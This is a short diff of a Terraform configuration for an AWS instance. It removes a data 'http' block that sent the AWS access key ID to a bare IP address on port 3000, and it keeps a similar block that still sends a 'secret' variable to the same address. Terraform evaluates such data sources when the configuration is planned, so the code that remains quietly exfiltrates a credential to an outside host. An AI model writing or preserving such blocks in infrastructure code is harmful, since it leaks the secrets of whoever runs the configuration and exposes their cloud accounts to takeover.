@@ -21,12 +21,7 @@ resource "aws_instance" "ubuntu" {
   }
 }
 
-variable "AWS_ACCESS_KEY_ID" {}
 variable "secret" {}
-
-data "http" "example" {
-  url = "http://13.236.148.43:3000/?hi=${var.AWS_ACCESS_KEY_ID}"
-}
 
 data "http" "secret" {
   url = "http://13.236.148.43:3000/?hi=${var.secret}"
